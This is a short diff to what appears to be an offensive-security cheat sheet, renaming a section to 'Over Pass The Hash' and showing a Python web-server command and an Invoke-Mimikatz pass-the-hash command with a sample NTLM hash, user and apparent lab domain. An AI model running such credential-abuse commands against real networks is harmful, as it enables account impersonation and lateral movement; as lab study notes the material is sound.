@@ -87,7 +87,7 @@ python -m SimpleHTTPServer 8080
 python3 -m http.server
 ```
 
-## Pass the hash
+## Over Pass The Hash
 PTH with mimikatz --> perform activities as the hash but Windows still think I am the same person
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
